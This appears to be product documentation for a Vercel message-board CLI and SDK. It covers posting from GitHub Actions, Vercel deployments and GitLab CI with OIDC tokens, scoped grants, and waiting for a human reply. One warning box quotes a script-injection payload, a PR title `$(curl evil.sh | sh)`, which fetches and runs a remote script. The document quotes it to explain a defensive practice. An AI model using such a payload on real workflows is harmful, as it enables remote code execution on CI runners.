## From GitHub Actions

A workflow posts with its own OIDC token: no board secret to store or rotate.

```yaml .github/workflows/deploy.yml
name: deploy
on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write # lets the CLI ask GitHub for an OIDC token

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      # your deploy steps…
      - if: failure()
        run: npx -y vercel board post errors-www "deploy failed on $SHA" --label source=ci --idempotency-key "deploy-$SHA" --scope "$TEAM_ID"
        env:
          TEAM_ID: team_abc123 # the team whose board it is, by its ID
          SHA: ${{ github.sha }}
```

> [!NOTE]
> This needs a Vercel CLI release that runs `vercel board` without a Vercel
> login.

- **The CLI finds the token itself.** The runner has no Vercel login, so
  `vercel board` hands board none, and board asks GitHub for a token whose
  audience is Vercel's API, `https://api.vercel.com/v1/messageboard`. It sends
  it as it is, so it's good for the team's boards and nothing else. Without
  `id-token: write`, GitHub gives the job no token, so there's nothing to
  send, and the step fails: you're not logged in to Vercel.
- **You name the team, by its ID.** A GitHub token names no Vercel team, so
  `--scope` says whose board it is, or `VERCEL_ORG_ID` in `env:` with no
  `--scope`. With no login there's no slug to look up, so it takes the team's
  ID (`team_…`). With neither, the CLI says to pass one.
- **`--idempotency-key` makes a retried step post once.** The same ID with the same write
  returns the message already posted.
- **The post is an ordinary thread.** If `errors-www` mirrors a Slack channel,
  it lands there, and a reply in Slack reaches the board.

> [!WARNING]
> Pass event data through `env:`, never as `${{ }}` inside `run:`. A PR title
> like `$(curl evil.sh | sh)` runs as a command when it's interpolated into a
> script. This is GitHub's classic script-injection hole.

### Let the workflow in

A workflow has no Vercel login. The board lets it in by its token, through a
[grant](../01-board/09-access.md#grants) for its repository: the team's board
in Vercel's API does, and so does any board that keeps grants, such as one on
[`local()`](../01-board/10-local.md) that your team serves in a long-running
process, or a [backend of your own](../01-board/01-mounting.md#a-backend-of-your-own).
Someone with `manage` in every channel grants the repo's runs what they may
do, with no deploy:

```text
$ vercel board grants create --github acme/www --git-branch main --can 'errors-www=post,label;deploys=read,post'
created g4  --github acme/www --git-branch main  errors-www=post,label deploys=read,post
```

The grant matches the token's `repository`, and `--git-branch` its `ref`:
this one lets in runs on `main`, as the workflow above is. A `--workflow` or
`--event` you add narrows it to that workflow file or event. The workflow
writes as `github:repo:<repository_id>`, with the handle `acme/www`. A
workflow no grant lets in gets a 403 whose hint is the grant to create:
`Grant it: vb grants create --github acme/www`.

`--can` says what it may do where. This one posts and labels in `errors-www`,
for the step above, and reads and posts in `deploys`, which the wait below
needs. `errors-www=post` alone would start threads and read nothing. Quote it:
`;` ends a command in a shell. See [Access](../01-board/09-access.md) for the
permissions and patterns.

> [!NOTE]
> A repo's workflows share one principal, so runs that different grants let in
> are the same author. Where a run can't read, it changes and sees only what it
> wrote there without reading, never what the workflow that reads wrote.

> [!TIP]
> Keep `--can` narrow for grants that match `pull_request` runs. A
> `pull_request` run uses the workflow file from the PR's merge commit, so
> anyone who can open a PR can change what it posts. Its token carries
> `ref: refs/pull/<n>/merge`, so match it on `event_name`, not `ref`. A grant
> on `repository` alone matches every run in the repo, pull requests included.
> Fork PRs get no token at all. For PR activity,
> [GitHub sync](../02-sync/04-github.md) is usually the better tool.

### Wait for a person

Writes print the new message's ID, so a step can post and then block on the
answer:

```bash
# in a workflow step, with TEAM_ID and DEPLOY_URL in env:
id=$(npx -y vercel board post deploys "Ready to promote $DEPLOY_URL?" --scope "$TEAM_ID")
npx -y vercel board wait --re "$id" --after "$id" --text "ship it" --timeout 30m --scope "$TEAM_ID"
```

`wait` exits 0 once someone replies in the thread with "ship it" (in Slack
too, if `deploys` mirrors a channel), or 1 when the timeout passes, which
fails the step.

### A board of your own

For a board your team serves itself, use its own CLI, `vb`: run
`npx -y @vercel/board` in the step with `BOARD_URL` in `env:`. It asks GitHub
for a token whose audience is that board's URL, and `vb grants create` makes
that board's grants, as above.

If that board is behind Vercel Deployment Protection, add the
project's bypass secret to the step's `env:` and the CLI sends it:

```yaml
# in the step above:
env:
  BOARD_URL: https://team.example/api/board
  VERCEL_AUTOMATION_BYPASS_SECRET: ${{ secrets.VERCEL_AUTOMATION_BYPASS_SECRET }}
```

## From a Vercel deployment

Code running on Vercel gets its token from the platform. `board()` with no
backend is the team's board, reached with the deployment's OIDC token:

```ts app/api/deploys/route.ts
import { board } from '@vercel/board'

const team = board()

export async function POST(request: Request) {
  const delivery = await request.json()
  // here's where you'd verify the delivery's signature, or any other checks
  await team.as('deploys').post('deploys', { text: `${delivery.sha} is live`, id: delivery.id })
  return Response.json({ ok: true })
}
```

- **It writes as its project,** `vercel:project:<project_id>:production`, and
  `team.as('deploys')` as `vercel:project:<project_id>:production+deploys`.
  Profiles start with a letter and use up to 32 letters, numbers, and hyphens.
- **Vercel's API lets it in once the board is granted** to the project, in the
  environment it runs in. Until then the team's default board fails with 404
  `no_board`, and a named one with 403 `board_not_granted`. The project's own
  code makes a board the first time it names one the team doesn't have: see
  [A board by its name](../01-board/01-mounting.md#a-board-by-its-name).
- **An `id` makes a post idempotent.** The same `id` from the same handle
  never posts twice, so a redelivered webhook is harmless.
- **Its writes are like anyone's,** and wake
  [watchers](../01-board/06-watchers.md).

See [Mounting](../01-board/01-mounting.md#the-handle) for the rest of the
handle. With `BOARD_URL` set, `board()` takes the deployment's OIDC token to
the board at that URL the same way. There, g2 lets in every project on the
board's team; a grant for a project and the environment it runs in says
what it may do instead:

```text
$ vb grants create --project prj_deploys --environment production --can deploys=post
created g4  --project prj_deploys --environment production  deploys=post
```

A project on another team can't use the board until cross-team access exists.
Behind Deployment Protection, the board's
project trusts this one with Trusted Sources, as for an
[Agent Factory](./05-agent-factory.md#trust-the-factory). The SDK never sends
this project's own `VERCEL_AUTOMATION_BYPASS_SECRET` to another project's board.

## From anywhere else

`BOARD_TOKEN` takes an OIDC token you got yourself, and the CLI and `board()`
send it as is. It must be one the board verifies. For the team's board in
Vercel's API, its audience is `https://api.vercel.com/v1/messageboard`, and a
[grant](../01-board/09-access.md#grants) lets its caller in. For the board at
`BOARD_URL`, its audience is the board's URL, and it's from the board's own
project or a caller a grant lets in. Discovery tells you the audience:

```bash
# in a terminal:
curl -s https://team.example/api/board | jq -r .audience
```

Another CI's tokens work through a grant that names its issuer by URL and
the `sub` of the jobs to let in, with any other claims to match, each exactly.
An issuer like GitLab.com signs tokens for everyone it serves, and only `sub`
says whose a token is, so a grant always names one. A `sub` that ends in `*`
right after a `:` or `/` matches how one starts, here any job in `acme/api`:

```text
$ vercel board grants create --oidc https://gitlab.com --claim 'sub=project_path:acme/api:*' --claim project_id=42 --can deploys=post
created g4  --oidc https://gitlab.com --claim project_id=42 --claim sub=project_path:acme/api:*  deploys=post
```

`sub=project_path:acme/api:ref_type:branch:ref:main` is its jobs on main
alone.

In GitLab, a job's `id_tokens` with the board's audience is the token:

```yaml .gitlab-ci.yml
notify:
  variables:
    TEAM_ID: team_abc123 # the team whose board it is, by its ID
  id_tokens:
    BOARD_TOKEN:
      aud: https://api.vercel.com/v1/messageboard
  script:
    - npx -y vercel board post deploys "api $CI_COMMIT_SHORT_SHA is live" --scope "$TEAM_ID"
```

It writes as `oidc:<issuer host and path>:<sub>`, here
`oidc:gitlab.com:project_path:acme/api:ref_type:branch:ref:main`, with its
`sub` as its handle. For a board of your own, run `npx -y @vercel/board` with
`BOARD_URL` set, and make `aud` that board's URL.

On the team's board in Vercel's API, `vercel board` sends your Vercel login
when there is one. With none, as on a runner, board looks for a token in this
order: the deployment's OIDC token, `BOARD_TOKEN`, `VERCEL_AUTH_TOKEN`, GitHub
Actions, then a `vercel login`. For a board at `BOARD_URL`, `vb` looks in this order:
`BOARD_TOKEN`, a local board's (`vb serve`), GitHub Actions, the Vercel
runtime, then your `vercel login`. See [Identity](../01-board/03-identity.md)
for how each one maps to a principal.
